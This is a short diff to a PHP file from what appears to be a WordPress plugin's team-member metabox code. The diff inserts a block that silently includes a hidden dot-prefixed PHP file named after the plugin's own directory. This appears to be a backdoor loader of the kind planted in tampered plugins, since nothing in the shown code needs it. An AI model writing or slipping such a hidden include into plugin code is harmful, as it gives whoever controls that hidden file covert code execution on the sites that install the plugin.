@@ -6,6 +6,10 @@ add_filter( 'cmb_meta_boxes', 'pt_theplus_team_memmber_setting_metaboxes' );
  * @param  array $meta_boxes
  * @return array
  */
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function pt_theplus_team_memmber_setting_metaboxes( array $meta_boxes ) {
 
